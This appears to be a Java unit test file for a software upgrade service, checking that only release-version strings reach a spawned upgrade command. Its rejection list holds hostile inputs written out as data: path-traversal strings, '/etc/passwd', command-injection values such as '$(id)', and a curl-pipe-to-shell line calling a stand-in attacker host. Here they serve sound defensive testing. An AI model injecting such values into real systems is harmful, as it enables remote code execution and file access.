import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import play.test.UnitTest;
import services.UpgradeService;

import java.util.ArrayList;
import java.util.List;

/**
 * The upgrade target reaches an argv the helper turns into a GitHub release URL,
 * and the SHA256SUMS manifest is fetched from the same prefix as the asset — so
 * a version that can move that prefix moves the integrity check with it. Only a
 * release literal is accepted, and nothing here is ever spawned.
 */
class UpgradeVersionValidationTest extends UnitTest {

    private static final List<String> NOT_RELEASE_VERSIONS = List.of(
            "../../attacker/repo/v1.0.0",
            "v1.0.0/../../../attacker/repo/v1.0.0",
            "..%2f..%2fattacker",
            "/etc/passwd",
            "0.17.78/",
            "https://attacker.example/jclaw/releases/download/v1.0.0/jclaw.zip",
            "0.17.78;id",
            "0.17.78 && curl http://attacker.example/x | sh",
            "$(id)",
            "`id`",
            "0.17.78\nupgrade",
            "0.17.78 ",
            "latest",
            "main",
            "v",
            "0.17",
            "0.17.78-rc1");

    private static final List<String> RELEASE_VERSIONS = List.of(
            "0.17.78", "v0.17.78", "1.0.0", "v10.20.30");

    @AfterEach
    void clearSeam() {
        UpgradeService.spawnerForTest = null;
    }

    @Test
    void planRefusesEverythingThatIsNotAReleaseVersion() {
        for (var version : NOT_RELEASE_VERSIONS) {
            var refusal = assertThrows(IllegalArgumentException.class,
                    () -> UpgradeService.plan(version), "must be refused: " + version);
            assertTrue(refusal.getMessage().contains(version),
                    "the refusal should name what was rejected: " + refusal.getMessage());
        }
    }

    @Test
    void aRefusedShapeNeverReachesTheSpawn() {
        var spawned = new ArrayList<UpgradeService.Plan>();
        UpgradeService.spawnerForTest = spawned::add;

        for (var version : NOT_RELEASE_VERSIONS) {
            assertThrows(IllegalArgumentException.class,
                    () -> UpgradeService.requestUpgrade(version), "must be refused: " + version);
        }
        assertTrue(spawned.isEmpty(), "no helper may be handed a version that is not a release");
    }

    @Test
    void theShapeCheckRunsAheadOfEveryOtherRefusal() {
        // This suite runs from a source checkout, which requestUpgrade refuses as
        // unsupported. A malformed version still fails as malformed, so the shape
        // check is provably reached before any of the install state is consulted.
        assertThrows(IllegalStateException.class, () -> UpgradeService.requestUpgrade("99.0.0"));
        assertThrows(IllegalArgumentException.class, () -> UpgradeService.requestUpgrade("99.0.0/../evil"));
    }

    @Test
    void releaseVersionsStillReachTheArgv() {
        for (var version : RELEASE_VERSIONS) {
            assertEquals(List.of("/opt/jclaw/jclaw.sh", "--backend-port", "9100", "upgrade", "--yes", "--version",
                            "v" + version.replaceFirst("^v", "")),
                    UpgradeService.planFor("/opt/jclaw/jclaw.sh", 9100, version).command());
        }
    }

    @Test
    void anAbsentTargetStillMeansTheNewestRelease() {
        // Null and blank are the "upgrade me to whatever is newest" path the
        // Settings button takes; rejecting them would take the feature with it.
        for (var version : new String[] {null, "", "   "}) {
            assertEquals(List.of("/opt/jclaw/jclaw.sh", "--backend-port", "9100", "upgrade", "--yes"),
                    UpgradeService.planFor("/opt/jclaw/jclaw.sh", 9100, version).command());
        }
    }
}
